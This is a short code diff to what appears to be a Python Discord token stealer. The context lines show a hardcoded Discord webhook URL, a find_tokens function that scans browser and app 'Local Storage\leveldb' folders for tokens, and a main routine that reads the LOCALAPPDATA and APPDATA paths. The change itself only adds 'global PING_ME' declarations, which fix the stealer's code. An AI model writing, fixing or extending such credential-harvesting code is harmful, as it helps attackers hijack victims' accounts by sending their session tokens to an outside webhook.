@@ -50,6 +50,7 @@ WEBHOOK_URL = 'https://discord.com/api/webhooks/1213517165752492144/-dvwI93Lok88
 PING_ME = False
 
 def find_tokens(path):
+    global PING_ME
     path += '\\Local Storage\\leveldb'
 
     tokens = []
@@ -65,6 +66,7 @@ def find_tokens(path):
     return tokens
 
 def main():
+    global PING_ME
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
